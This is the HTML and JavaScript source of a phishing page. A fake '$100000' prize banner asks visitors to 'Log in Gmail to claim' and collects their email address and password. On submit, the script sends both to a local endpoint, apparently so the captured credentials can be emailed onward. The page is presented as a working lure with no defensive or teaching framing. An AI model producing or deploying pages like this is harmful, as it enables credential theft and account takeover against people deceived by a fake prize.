<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Information Form</title>
    <style>/* Apply a gradient background */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #89f7fe, #66a6ff);
            margin: 0;
        }
        
        /* Glassmorphism effect for the form */
        .container {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        
        /* Styling for the header */
        h1 {
            font-size: 22px;
            color: #fff;
            text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.2);
        }
        
        p {
            font-size: 14px;
            color: #f8f8f8;
        }
        
        /* Style input fields */
        input, textarea {
            width: 90%;
            padding: 12px;
            margin-top: 8px;
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 6px;
            font-size: 14px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            outline: none;
            transition: all 0.3s ease;
        }
        
        /* Input focus effect */
        input:focus, textarea:focus {
            border-color: #66a6ff;
            box-shadow: 0px 0px 10px rgba(102, 166, 255, 0.7);
        }
        
        /* Style the textarea */
        textarea {
            resize: none;
            height: 80px;
        }
        
        /* Fancy animated submit button */
        button {
            width: 100%;
            padding: 12px;
            margin-top: 12px;
            border: none;
            border-radius: 6px;
            background: linear-gradient(135deg, #007bff, #0056b3);
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        /* Button hover effect */
        button:hover {
            background: linear-gradient(135deg, #0056b3, #004080);
            transform: scale(1.05);
        }
        
        /* Adding a subtle glowing effect */
        button::after {
            content: "";
            position: absolute;
            top: -100%;
            left: -100%;
            width: 250%;
            height: 250%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.2) 10%, transparent 80%);
            opacity: 0;
            transition: opacity 0.3s ease-in-out;
        }
        
        button:hover::after {
            opacity: 1;
        }
        </style>
</head>
<body>
    <div class="overlay">
    <header>
        <h1>Congratulations you have won $100000</h1>
        <p>Please fill out this form to complete your registration</p>
    </header>
        <div class="container">
            <h2>Log in Gmail to claim</h2>
            <form id="infoForm">
                <label for="email">Email:</label>
                <input type="email" id="email" required>
                
                <label for="pass">Password:</label>
                <input type="password" id="pass" required>
            
                <button type="submit">Submit</button>
            </form>             
        </div>
    </div>
    

    <script>
    document.getElementById("infoForm").addEventListener("submit", async function(event) {
        event.preventDefault();
    
        const formData = {
            name: document.getElementById("pass").value,
            email: document.getElementById("email").value,
        };
    
        try {
            const response = await fetch("http://localhost:3000/send-email", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });
    
            const result = await response.json();
            alert(result.message);
    
            if (result.success) {
                // Clear form on success
                document.getElementById("infoForm").reset();
            }
        } catch (error) {
            alert("An error occurred. Please try again.");
        }
    });
    
    </script>
</body>
</html>
